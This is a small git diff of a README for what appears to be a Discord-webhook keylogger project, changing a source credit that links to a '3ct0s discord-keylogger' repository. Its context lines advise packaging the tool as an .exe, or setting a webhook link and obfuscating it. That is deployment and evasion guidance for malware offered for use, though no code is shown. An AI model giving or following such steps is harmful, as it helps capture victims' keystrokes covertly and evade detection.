@@ -22,4 +22,5 @@ For any issues, please DM Me on Discord or Create an issue on this repo. I will 
 Convert it to an .exe using [auto-py-to-exe](https://github.com/brentvollebregt/auto-py-to-exe) or set your Webhook link and obfuscate it.
 
 ## Sources
-(KeyLogger System made by 3ct0s)[https://github.com/3ct0s/discord-keylogger]
+(KeyLogger System by 3ct0s)
+(KeyLogger System by 3ct0s)[https://github.com/3ct0s/discord-keylogger]
